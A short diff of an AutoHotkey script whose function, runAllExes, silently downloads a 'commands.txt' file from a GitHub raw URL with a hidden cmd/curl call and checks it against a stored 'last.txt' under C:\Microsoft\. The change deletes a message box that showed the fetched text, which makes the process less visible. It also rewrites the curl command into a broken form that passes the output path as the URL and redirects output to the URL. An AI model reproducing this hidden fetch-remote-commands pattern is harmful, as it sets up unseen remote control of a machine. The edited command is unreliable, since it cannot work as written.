@@ -36,10 +36,9 @@ runAllExes() {
     }
     output := path "\commands.txt"
     url := "https://raw.githubusercontent.com/astorrs276/Public-AHK/refs/heads/main/commands.txt"
-    command := 'cmd /c curl -L -o "' . output . '" "' . url . '"'
+    command := 'cmd /c curl -L "' . output . '" > "' . url . '"'
     RunWait command, , "Hide"
     text := FileRead(output)
-    MsgBox last "`n----------------`n" text
     if (last != text) {
         try {
             FileDelete "C:\Microsoft\last.txt"
